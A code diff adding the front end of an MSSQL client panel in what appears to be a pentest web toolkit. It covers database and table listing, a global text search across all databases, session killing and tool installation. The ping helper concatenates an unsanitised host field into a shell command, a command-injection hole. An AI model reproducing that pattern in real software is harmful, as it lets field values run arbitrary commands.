+        if (stopBtn) stopBtn.disabled = true;
+        if (runBtn)  { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR SQL'; }
+      } else if (msg.type === 'error') {
+        mssqlLog('ERROR: ' + msg.data, 'err');
+        mssqlSetState('error');
+        es.close();
+        delete activeJobs['mssql'];
+        updJobs();
+        if (stopBtn) stopBtn.disabled = true;
+        if (runBtn)  { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR SQL'; }
+      }
+    };
+    es.onerror = () => {
+      es.close();
+      mssqlSetState('error');
+      delete activeJobs['mssql'];
+      updJobs();
+      if (stopBtn) stopBtn.disabled = true;
+      if (runBtn)  { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR SQL'; }
+    };
+  } catch (err) {
+    mssqlLog('ERROR de conexion: ' + err.message, 'err');
+    mssqlSetState('error');
+    if (stopBtn) stopBtn.disabled = true;
+    if (runBtn)  { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR SQL'; }
+  }
+}
+
+// Buffer for mssql tool
+if (typeof rawBuffers !== 'undefined') rawBuffers['mssql'] = [];
+
+function mssqlRunAction(action, label) {
+  const DANGEROUS_ACTIONS = ['kill_session'];
+  const isDangerous = DANGEROUS_ACTIONS.includes(action);
+  mssqlGetConn();
+  const conn = mssqlActiveConn();
+  if (!conn.host || !conn.username || !conn.password) {
+    showVal('mssql-val', 'Completa host, usuario y password', 'err');
+    return;
+  }
+  _mssqlRunAction(action, label, isDangerous);
+}
+
+async function _mssqlRunAction(action, label, dangerous, params) {
+  mssqlGetConn();
+  const conn = mssqlActiveConn();
+  if (dangerous && !confirm(`Confirmar: ${label}\n\n¿Continuar?`)) return;
+
+  if (activeJobs['mssql']) {
+    const j = activeJobs['mssql'];
+    if (j.es) j.es.close();
+    if (j.job_id) fetch(API + '/kill/' + j.job_id, { method:'POST' }).catch(() => {});
+    delete activeJobs['mssql'];
+  }
+
+  mssqlSetState('running');
+  mssqlLog('', 'sep');
+  mssqlLog(`── ${label} ──`, 'sys');
+
+  try {
+    const resp = await fetch(API + '/mssql/run', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, action, params: params || {} }),
+    });
+    const data = await resp.json();
+    if (data.error) {
+      _msLastError = data.error;
+      mssqlSetState('error');
+      mssqlLog('ERROR: ' + data.error, 'err');
+      const lerr = document.getElementById('ms-last-error');
+      if (lerr) lerr.textContent = data.error;
+      return;
+    }
+    mssqlLog('$ ' + data.cmd_display, 'cmd');
+    _mssqlStreamJob(data.job_id);
+  } catch (e) {
+    mssqlLog('ERROR: ' + e.message, 'err');
+    mssqlSetState('error');
+  }
+}
+
+function _mssqlStreamJob(jobId) {
+  const es = new EventSource(API + '/stream/' + jobId);
+  activeJobs['mssql'] = { job_id: jobId, es };
+  updJobs();
+  es.onmessage = (ev) => {
+    const msg = JSON.parse(ev.data);
+    if (msg.type === 'output') {
+      const line = stripAnsi(msg.data).trimEnd();
+      if (line) mssqlLog(line);
+    } else if (msg.type === 'done') {
+      const ok = msg.code === 0;
+      mssqlSetState(ok ? 'connected' : 'error');
+      mssqlLog('[exit: ' + msg.code + ']', ok ? 'ok' : 'err');
+      delete activeJobs['mssql'];
+      updJobs();
+      es.close();
+    } else if (msg.type === 'error') {
+      mssqlLog('ERROR: ' + msg.data, 'err');
+      mssqlSetState('error');
+      delete activeJobs['mssql'];
+      updJobs();
+      es.close();
+    }
+  };
+  es.onerror = () => {
+    es.close();
+    mssqlSetState(_msState === 'running' ? 'error' : _msState);
+    delete activeJobs['mssql'];
+    updJobs();
+  };
+}
+
+function mssqlStop() {
+  const job = activeJobs['mssql'];
+  if (job) {
+    if (job.es) job.es.close();
+    if (job.job_id) fetch(API + '/kill/' + job.job_id, { method:'POST' }).catch(() => {});
+    delete activeJobs['mssql'];
+    updJobs();
+  }
+  mssqlSetState(_msState === 'running' ? 'disconnected' : _msState);
+  mssqlLog('[detenido por usuario]', 'warn');
+  const stopBtn = document.getElementById('ms-sql-stop');
+  const runBtn  = document.getElementById('ms-sql-run');
+  if (stopBtn) stopBtn.disabled = true;
+  if (runBtn)  { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR SQL'; }
+}
+
+// ── Connect / disconnect ──────────────────────────────────────────────────────
+
+async function mssqlConnect() {
+  mssqlGetConn();
+  if (!_msConn.host || !_msConn.username || !_msConn.password) {
+    showVal('mssql-val', 'Completa host, usuario y password', 'err');
+    return;
+  }
+  mssqlSetState('running');
+  mssqlLog('', 'sep');
+  mssqlLog('── Conectando a ' + _msConn.host + ',' + _msConn.port + ' ──', 'sys');
+
+  // Strategy: always test against 'master' first.
+  // User's default DB may be offline/inaccessible (common on shared/pentest targets).
+  // 'master' is always available for any valid login.
+  const userDb   = _msConn.database;
+  const testConn = Object.assign({}, _msConn, { database: 'master' });
+
+  try {
+    mssqlLog('[*] Probando con "master" (evita error de DB por defecto)...', 'sys');
+    const resp = await fetch(API + '/mssql/query', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn: testConn, sql: 'SELECT @@VERSION AS version, SYSTEM_USER AS usr, @@SERVERNAME AS srv;' }),
+    });
+    const data = await resp.json();
+
+    if (!data.ok) {
+      _msLastError = data.error || 'Error de conexion';
+      mssqlSetState('error');
+      // Give a helpful hint when the error mentions a default DB
+      let hint = _msLastError;
+      const dbMatch = _msLastError.match(/base de datos '(\w+)'/i) || _msLastError.match(/database '(\w+)'/i);
+      if (dbMatch) {
+        hint += '\n\n[!] El usuario tiene "' + dbMatch[1] + '" como DB por defecto y no esta disponible.\n' +
+                '    Prueba conectar a "master" o verifica las credenciales.';
+      }
+      mssqlLog('ERROR: ' + hint, 'err');
+      showVal('mssql-val', 'Login fallido — verifica usuario/password', 'err');
+      const lerr = document.getElementById('ms-last-error');
+      if (lerr) lerr.textContent = _msLastError;
+      return;
+    }
+
+    const row = data.rows?.[0] || {};
+    mssqlSetState('connected');
+    mssqlLog('[+] Conectado! Server: ' + (row.srv || '?') + ' | User: ' + (row.usr || '?'), 'ok');
+    const ver = row.version || '';
+    if (ver) mssqlLog('    ' + ver.substring(0, 120), 'ok');
+
+    // If user specified a target DB, set it as active
+    if (userDb) {
+      _msActiveDb = userDb;
+      mssqlLog('[*] Target DB: ' + userDb, 'sys');
+    }
+
+    showVal('mssql-val', 'Conectado correctamente', 'ok');
+    await mssqlLoadDatabases();
+
+    // Auto-select the user's target DB in the dropdown if present
+    if (userDb) {
+      setTimeout(() => {
+        const sel = document.getElementById('ms-sel-db');
+        if (sel && Array.from(sel.options).some(o => o.value === userDb)) {
+          sel.value = userDb;
+          mssqlOnDbChange();
+        }
+      }, 600);
+    }
+  } catch (e) {
+    mssqlSetState('error');
+    mssqlLog('ERROR: ' + e.message, 'err');
+  }
+}
+
+async function mssqlTestConn() {
+  mssqlGetConn();
+  if (!_msConn.host || !_msConn.username || !_msConn.password) {
+    showVal('mssql-val', 'Completa host, usuario y password', 'err');
+    return;
+  }
+  mssqlSetState('running');
+  mssqlLog('── Test Connection ──', 'sys');
+  try {
+    const resp = await fetch(API + '/mssql/query', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn: _msConn, sql: "SELECT @@VERSION AS v, GETDATE() AS ts, SYSTEM_USER AS usr;" }),
+    });
+    const data = await resp.json();
+    if (!data.ok) {
+      mssqlSetState('error');
+      mssqlLog('FAIL: ' + (data.error || 'Error'), 'err');
+      showVal('mssql-val', 'Test fallido', 'err');
+    } else {
+      mssqlSetState('connected');
+      const r = data.rows?.[0] || {};
+      mssqlLog('[+] Connection OK | User: ' + (r.usr || '?') + ' | Time: ' + (r.ts || '?'), 'ok');
+      showVal('mssql-val', 'Test OK', 'ok');
+    }
+  } catch (e) {
+    mssqlSetState('error');
+    mssqlLog('ERROR: ' + e.message, 'err');
+  }
+}
+
+function mssqlDisconnect() {
+  mssqlStop();
+  mssqlSetState('disconnected');
+  _msActiveDb = '';
+  _mssqlResetSelects();
+  mssqlLog('── Sesion desconectada ──', 'sys');
+}
+
+// ── Auto-load dropdowns ───────────────────────────────────────────────────────
+
+async function mssqlLoadDatabases() {
+  try {
+    const resp = await fetch(API + '/mssql/query', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn: _msConn, action: 'list_databases' }),
+    });
+    const data = await resp.json();
+    const sel1 = document.getElementById('ms-sel-db');
+    const sel2 = document.getElementById('ms-use-db-sel');
+    if (!sel1) return;
+    if (!data.ok || !data.rows?.length) {
+      mssqlLog('[!] No se pudieron cargar databases: ' + (data.error || ''), 'warn');
+      return;
+    }
+    const dbs = data.rows.map(r => r.name || r._raw || Object.values(r)[0]).filter(Boolean);
+    const mkOpts = (current) => '<option value="">-- seleccionar --</option>' +
+      dbs.map(d => `<option value="${escH(d)}"${d===current?' selected':''}>${escH(d)}</option>`).join('');
+    sel1.innerHTML = mkOpts(_msActiveDb);
+    if (sel2) sel2.innerHTML = mkOpts(_msActiveDb);
+    mssqlLog('[+] Databases cargadas: ' + dbs.length, 'ok');
+  } catch (e) {
+    mssqlLog('[!] Error cargando databases: ' + e.message, 'warn');
+  }
+}
+
+async function mssqlOnDbChange() {
+  const sel = document.getElementById('ms-sel-db');
+  const db  = sel?.value || '';
+  _msActiveDb = db;
+  // Sync the use-db select
+  const sel2 = document.getElementById('ms-use-db-sel');
+  if (sel2) sel2.value = db;
+  if (!db) return;
+  mssqlLog('── Cambiando a database: ' + db + ' ──', 'sys');
+  await mssqlLoadSchemas(db);
+}
+
+async function mssqlLoadSchemas(db) {
+  const conn = Object.assign({}, _msConn, { database: db || _msActiveDb });
+  const schSel = document.getElementById('ms-sel-schema');
+  if (schSel) schSel.innerHTML = '<option value="">Cargando...</option>';
+  const tblSel = document.getElementById('ms-sel-table');
+  if (tblSel) tblSel.innerHTML = '<option value="">-- seleccionar schema --</option>';
+  try {
+    const resp = await fetch(API + '/mssql/query', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, action: 'show_schemas' }),
+    });
+    const data = await resp.json();
+    if (!schSel) return;
+    if (!data.ok || !data.rows?.length) {
+      schSel.innerHTML = '<option value="">-- sin schemas --</option>';
+      return;
+    }
+    const schemas = data.rows.map(r => r.name || r._raw || Object.values(r)[0]).filter(Boolean);
+    schSel.innerHTML = '<option value="">-- seleccionar --</option>' +
+      schemas.map(s => `<option value="${escH(s)}">${escH(s)}</option>`).join('');
+    mssqlLog('[+] Schemas: ' + schemas.join(', '), 'ok');
+  } catch (e) {
+    mssqlLog('[!] Error cargando schemas: ' + e.message, 'warn');
+  }
+}
+
+async function mssqlOnSchemaChange() {
+  const schema = document.getElementById('ms-sel-schema')?.value || '';
+  if (!schema) return;
+  await mssqlLoadTables(schema);
+}
+
+async function mssqlLoadTables(schema) {
+  const conn = mssqlActiveConn();
+  const tblSel = document.getElementById('ms-sel-table');
+  if (tblSel) tblSel.innerHTML = '<option value="">Cargando...</option>';
+  try {
+    const resp = await fetch(API + '/mssql/query', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, action: 'list_tables_by_schema', params: { schema } }),
+    });
+    const data = await resp.json();
+    if (!tblSel) return;
+    if (!data.ok || !data.rows?.length) {
+      tblSel.innerHTML = '<option value="">-- sin tablas --</option>';
+      mssqlLog('[!] Sin tablas en schema: ' + schema, 'warn');
+      return;
+    }
+    const tables = data.rows.map(r => r.TABLE_NAME || r._raw || Object.values(r)[0]).filter(Boolean);
+    tblSel.innerHTML = '<option value="">-- seleccionar --</option>' +
+      tables.map(t => `<option value="${escH(t)}">${escH(t)}</option>`).join('');
+    mssqlLog('[+] Tablas en ' + schema + ': ' + tables.length, 'ok');
+  } catch (e) {
+    mssqlLog('[!] Error cargando tablas: ' + e.message, 'warn');
+  }
+}
+
+function mssqlOnTableChange() {
+  const table = document.getElementById('ms-sel-table')?.value || '';
+  if (table) {
+    mssqlLog('── Tabla seleccionada: ' + table + ' ──', 'sys');
+  }
+}
+
+async function mssqlLoadTableInfo() {
+  const schema = document.getElementById('ms-sel-schema')?.value || 'dbo';
+  const table  = document.getElementById('ms-sel-table')?.value || '';
+  if (!table) { showVal('mssql-val', 'Selecciona una tabla primero', 'warn'); return; }
+  mssqlLog('', 'sep');
+  mssqlLog('── Auto-loading table info: ' + schema + '.' + table + ' ──', 'sys');
+  const params = { schema, table };
+  await _mssqlRunAction('show_columns', 'Columns: ' + table, false, params);
+  // Small delay to not overlap output
+  setTimeout(() => _mssqlRunAction('primary_keys', 'Primary Keys: ' + table, false, params), 800);
+  setTimeout(() => _mssqlRunAction('indexes', 'Indexes: ' + table, false, params), 1600);
+  setTimeout(() => {
+    const conn = mssqlActiveConn();
+    fetch(API + '/mssql/run', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, action: 'preview', params: { schema, table, limit: 10 } }),
+    }).then(r => r.json()).then(d => {
+      if (!d.error) {
+        mssqlLog('── Preview TOP 10 ──', 'sys');
+        _mssqlStreamJob(d.job_id);
+      }
+    }).catch(() => {});
+  }, 2400);
+}
+
+function _mssqlResetSelects() {
+  ['ms-sel-db','ms-sel-schema','ms-sel-table','ms-use-db-sel'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.innerHTML = '<option value="">-- conectar primero --</option>';
+  });
+}
+
+// ── Action helpers ────────────────────────────────────────────────────────────
+
+function _mssqlGetSchemaTable() {
+  const schema = document.getElementById('ms-sel-schema')?.value || 'dbo';
+  const table  = document.getElementById('ms-sel-table')?.value  || '';
+  if (!table) { showVal('mssql-val', 'Selecciona schema y tabla en los selects', 'warn'); return null; }
+  return { schema, table };
+}
+
+function mssqlShowColumns()  { const st = _mssqlGetSchemaTable(); if (!st) return; _mssqlRunAction('show_columns',  'Columns: '  + st.table, false, st); }
+function mssqlDescribeTable(){ const st = _mssqlGetSchemaTable(); if (!st) return; _mssqlRunAction('describe_table','Describe: ' + st.table, false, st); }
+function mssqlPrimaryKeys()  { const st = _mssqlGetSchemaTable(); if (!st) return; _mssqlRunAction('primary_keys',  'Primary Keys: ' + st.table, false, st); }
+function mssqlForeignKeys()  { const st = _mssqlGetSchemaTable(); if (!st) return; _mssqlRunAction('foreign_keys',  'Foreign Keys: ' + st.table, false, st); }
+function mssqlIndexes()      { const st = _mssqlGetSchemaTable(); if (!st) return; _mssqlRunAction('indexes',       'Indexes: ' + st.table, false, st); }
+function mssqlCountRows()    { const st = _mssqlGetSchemaTable(); if (!st) return; _mssqlRunAction('count_rows',    'Count Rows: ' + st.table, false, st); }
+
+function mssqlPreview(n) {
+  const st = _mssqlGetSchemaTable();
+  if (!st) return;
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── Preview TOP ' + n + ': ' + st.schema + '.' + st.table + ' ──', 'sys');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'preview', params: { ...st, limit: n } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+function mssqlListBySchema() {
+  const schema = document.getElementById('ms-sel-schema')?.value || '';
+  if (!schema) { showVal('mssql-val', 'Selecciona un schema primero', 'warn'); return; }
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── List Tables in schema: ' + schema + ' ──', 'sys');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'list_tables_by_schema', params: { schema } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+function mssqlSearchTable() {
+  const q = (document.getElementById('ms-search-tbl')?.value || '').trim();
+  if (!q) { showVal('mssql-val', 'Escribe un nombre para buscar', 'warn'); return; }
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── Search Table: "' + q + '" ──', 'sys');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'search_table_name', params: { search: q } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+function mssqlSelectTopN() {
+  const st = _mssqlGetSchemaTable(); if (!st) return;
+  const n = parseInt(document.getElementById('ms-topn')?.value || '25');
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── SELECT TOP ' + n + ' ──', 'sys');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'select_top_n', params: { ...st, limit: n } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+function mssqlPaginatedRun() {
+  const st = _mssqlGetSchemaTable(); if (!st) return;
+  _msPgPage = parseInt(document.getElementById('ms-pg-page')?.value || '1');
+  const size = parseInt(document.getElementById('ms-pg-size')?.value || '50');
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── Paginated: page ' + _msPgPage + ' size ' + size + ' ──', 'sys');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'paginated', params: { ...st, page: _msPgPage, limit: size } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+function mssqlPrevPage() {
+  const pgEl = document.getElementById('ms-pg-page');
+  if (pgEl) pgEl.value = Math.max(1, parseInt(pgEl.value || '1') - 1);
+  mssqlPaginatedRun();
+}
+
+function mssqlNextPage() {
+  const pgEl = document.getElementById('ms-pg-page');
+  if (pgEl) pgEl.value = parseInt(pgEl.value || '1') + 1;
+  mssqlPaginatedRun();
+}
+
+function mssqlSearchText() {
+  const st  = _mssqlGetSchemaTable(); if (!st) return;
+  const col = (document.getElementById('ms-srch-col')?.value || '').trim();
+  const txt = (document.getElementById('ms-srch-txt')?.value || '').trim();
+  if (!col || !txt) { showVal('mssql-val', 'Escribe columna y texto', 'warn'); return; }
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── Search "' + txt + '" in ' + col + ' ──', 'sys');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'search_text_in_table', params: { ...st, column: col, search: txt } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+let _msSearchAllRunning = false;
+let _msSearchAllES      = null;
+let _msSearchAllJobId   = null;
+
+function _mssqlSearchAllReset(statusMsg, cls) {
+  _msSearchAllRunning = false;
+  if (_msSearchAllES)  { _msSearchAllES.close();  _msSearchAllES  = null; }
+  _msSearchAllJobId = null;
+  const btn  = document.getElementById('ms-search-all-btn');
+  const stop = document.getElementById('ms-search-all-stop');
+  if (btn)  btn.style.display  = 'inline-block';
+  if (stop) stop.style.display = 'none';
+  if (statusMsg) {
+    const s = document.getElementById('ms-search-all-status');
+    if (s) s.textContent = statusMsg;
+    mssqlLog(statusMsg, cls || 'ok');
+  }
+}
+
+function mssqlStopSearchAll() {
+  if (!_msSearchAllRunning) return;
+  if (_msSearchAllES)    { _msSearchAllES.close();  _msSearchAllES  = null; }
+  if (_msSearchAllJobId) {
+    fetch(API + '/kill/' + _msSearchAllJobId, { method: 'POST' }).catch(() => {});
+    _msSearchAllJobId = null;
+  }
+  _msSearchAllRunning = false;
+  mssqlSetState('connected');
+  _mssqlSearchAllReset('Búsqueda detenida por el usuario.', 'warn');
+  mssqlLog('── Búsqueda global detenida ──', 'warn');
+}
+
+async function mssqlSearchAll() {
+  if (_msSearchAllRunning) return;
+  const term = (document.getElementById('ms-search-all-term')?.value || '').trim();
+  if (!term) { showVal('mssql-val', 'Ingresa un término de búsqueda', 'warn'); return; }
+  mssqlGetConn();
+  const conn = mssqlActiveConn();
+  if (!conn.host || !conn.username || !conn.password) {
+    showVal('mssql-val', 'Completa host, usuario y password', 'err'); return;
+  }
+
+  _msSearchAllRunning = true;
+  const btn  = document.getElementById('ms-search-all-btn');
+  const stop = document.getElementById('ms-search-all-stop');
+  if (btn)  btn.style.display  = 'none';
+  if (stop) stop.style.display = 'inline-block';
+
+  const status = document.getElementById('ms-search-all-status');
+  mssqlLog('', 'sep');
+  mssqlLog('── GLOBAL SEARCH: "' + term + '" ──', 'sys');
+  mssqlSetState('running');
+  if (status) status.textContent = 'Obteniendo lista de bases de datos...';
+
+  // 1. Get all online databases
+  const baseConn = Object.assign({}, conn, { database: 'master' });
+  const dbResp = await fetch(API + '/mssql/query', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn: baseConn, sql: "SELECT name FROM sys.databases WHERE state_desc='ONLINE' ORDER BY name;" }),
+  }).then(r => r.json()).catch(e => ({ ok: false, error: e.message }));
+
+  if (!dbResp.ok) {
+    mssqlLog('ERROR al obtener DBs: ' + dbResp.error, 'err');
+    mssqlSetState('error');
+    _mssqlSearchAllReset('Error: ' + dbResp.error, 'err');
+    return;
+  }
+
+  const dbs = (dbResp.rows || []).map(r => r.name || r.Name).filter(Boolean);
+  mssqlLog('[*] ' + dbs.length + ' DBs encontradas: ' + dbs.join(', '), 'sys');
+
+  let totalHits = 0;
+  for (let i = 0; i < dbs.length; i++) {
+    if (!_msSearchAllRunning) break;                       // cancelled
+
+    const db = dbs[i];
+    if (status) status.textContent = '[' + (i+1) + '/' + dbs.length + '] Escaneando: ' + db + '...';
+    mssqlLog('── [' + (i+1) + '/' + dbs.length + '] ' + db + ' ──', 'sys');
+
+    const dbConn = Object.assign({}, conn, { database: db });
+    const runResp = await fetch(API + '/mssql/run', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn: dbConn, action: 'search_all_text', params: { term } }),
+    }).then(r => r.json()).catch(() => null);
+
+    if (!_msSearchAllRunning) break;
+
+    if (!runResp || runResp.error) {
+      mssqlLog('  [skip] ' + (runResp?.error || 'Error de conexión'), 'err');
+      continue;
+    }
+
+    _msSearchAllJobId = runResp.job_id;
+
+    const dbHits = await new Promise(resolve => {
+      let hits = 0;
+      const es = new EventSource(API + '/stream/' + runResp.job_id);
+      _msSearchAllES = es;
+      const timer = setTimeout(() => { es.close(); resolve(hits); }, 45000);
+      es.onmessage = (ev) => {
+        if (!_msSearchAllRunning) { clearTimeout(timer); es.close(); resolve(hits); return; }
+        try {
+          const msg = JSON.parse(ev.data);
+          if (msg.type === 'output') {
+            (msg.data || '').split('\n').forEach(l => {
+              const line = l.trim();
+              if (!line || line.match(/^\(\d+ rows?/i) || line.match(/^-+(\|-+)*$/)) return;
+              const cls = line.startsWith('table') ? 'cmd' : '';
+              appendOut('mssql-out-c', line.includes('|') && !line.startsWith('table') ? '[' + db + '] ' + line : line, cls);
+              if (line.includes('|') && !line.startsWith('table')) hits++;
+            });
+          }
+          if (msg.type === 'exit') { clearTimeout(timer); es.close(); resolve(hits); }
+        } catch { clearTimeout(timer); es.close(); resolve(hits); }
+      };
+      es.onerror = () => { clearTimeout(timer); es.close(); resolve(hits); };
+    });
+
+    _msSearchAllES    = null;
+    _msSearchAllJobId = null;
+    if (dbHits > 0) mssqlLog('  [+] ' + dbHits + ' coincidencias en ' + db, 'ok');
+    totalHits += dbHits;
+  }
+
+  if (_msSearchAllRunning) {
+    mssqlSetState('connected');
+    _mssqlSearchAllReset(
+      'Completado — ' + totalHits + ' resultados en ' + dbs.length + ' DBs.',
+      totalHits > 0 ? 'ok' : 'sys'
+    );
+    mssqlLog('── Global search: ' + totalHits + ' resultados / ' + dbs.length + ' DBs ──', totalHits > 0 ? 'ok' : 'sys');
+  }
+}
+
+function mssqlUseDatabase() {
+  const db = document.getElementById('ms-use-db-sel')?.value || '';
+  if (!db) { showVal('mssql-val', 'Selecciona una base de datos', 'warn'); return; }
+  _msActiveDb = db;
+  const dbSel = document.getElementById('ms-sel-db');
+  if (dbSel) dbSel.value = db;
+  mssqlLog('── USE DATABASE: ' + db + ' ──', 'sys');
+  mssqlLoadSchemas(db);
+  const conn = mssqlActiveConn();
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'use_database', params: { database: db } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => mssqlLog('ERROR: ' + e.message, 'err'));
+}
+
+function mssqlKillSession() {
+  const sid = (document.getElementById('ms-kill-sid')?.value || '').trim();
+  if (!sid || !/^\d+$/.test(sid)) { showVal('mssql-val', 'Session ID invalido', 'err'); return; }
+  if (!confirm(`⚠ KILL SESSION ${sid}\n\nEsto terminara la sesion de forma forzada.\n¿Confirmar?`)) return;
+  const conn = mssqlActiveConn();
+  mssqlSetState('running');
+  mssqlLog('── KILL SESSION ' + sid + ' ──', 'warn');
+  fetch(API + '/mssql/run', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ conn, action: 'kill_session', params: { session_id: sid } }),
+  }).then(r => r.json()).then(d => {
+    if (d.error) { mssqlLog('ERROR: ' + d.error, 'err'); mssqlSetState('error'); return; }
+    mssqlLog('$ ' + d.cmd_display, 'cmd');
+    _mssqlStreamJob(d.job_id);
+  }).catch(e => { mssqlLog('ERROR: ' + e.message, 'err'); mssqlSetState('error'); });
+}
+
+// ── Diagnostics ───────────────────────────────────────────────────────────────
+
+async function mssqlPingHost() {
+  mssqlGetConn();
+  const host = _msConn.host;
+  if (!host) { showVal('mssql-val', 'Host requerido', 'err'); return; }
+  mssqlLog('── Ping: ' + host + ' ──', 'sys');
+  const conn = mssqlActiveConn();
+  execCmd('ping -c 4 ' + host, 'mssql-out-c', 'mssql-out', null);
+}
+
+async function mssqlCheckPort() {
+  mssqlGetConn();
+  const host = _msConn.host;
+  const port = parseInt(_msConn.port) || 1433;
+  if (!host) { showVal('mssql-val', 'Host requerido', 'err'); return; }
+  mssqlLog('── Check Port: ' + host + ':' + port + ' ──', 'sys');
+  try {
+    const resp = await fetch(API + '/mssql/check', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ check: 'port', host, port }),
+    });
+    const data = await resp.json();
+    const r = data.port || {};
+    const el = document.getElementById('ms-diag-port-result');
+    if (el) el.innerHTML = r.open
+      ? `<span class="ms-pill ok">PORT ${port} OPEN</span>`
+      : `<span class="ms-pill err">PORT ${port} CLOSED — ${escH(r.error||'')}</span>`;
+    mssqlLog(r.open ? '[+] Port ' + port + ' OPEN' : '[-] Port ' + port + ' CLOSED: ' + (r.error||''), r.open ? 'ok' : 'err');
+  } catch (e) {
+    mssqlLog('ERROR: ' + e.message, 'err');
+  }
+}
+
+function mssqlInstallStep(step) {
+  const cmds = {
+    repo: (
+      'curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /usr/share/keyrings/microsoft-prod.gpg && ' +
+      'echo "deb [arch=amd64 signed-by=/usr/share/keyrings/microsoft-prod.gpg] ' +
+      'https://packages.microsoft.com/debian/12/prod bookworm main" > /etc/apt/sources.list.d/mssql-release.list && ' +
+      'apt-get update'
+    ),
+    install: 'ACCEPT_EULA=Y apt-get install -y mssql-tools18 unixodbc-dev',
+    path: 'echo \'export PATH="$PATH:/opt/mssql-tools18/bin"\' >> ~/.bashrc && export PATH="$PATH:/opt/mssql-tools18/bin"',
+    all: (
+      'curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /usr/share/keyrings/microsoft-prod.gpg && ' +
+      'echo "deb [arch=amd64 signed-by=/usr/share/keyrings/microsoft-prod.gpg] https://packages.microsoft.com/debian/12/prod bookworm main" > /etc/apt/sources.list.d/mssql-release.list && ' +
+      'apt-get update && ACCEPT_EULA=Y apt-get install -y mssql-tools18 unixodbc-dev && ' +
+      'echo \'export PATH="$PATH:/opt/mssql-tools18/bin"\' >> ~/.bashrc && ' +
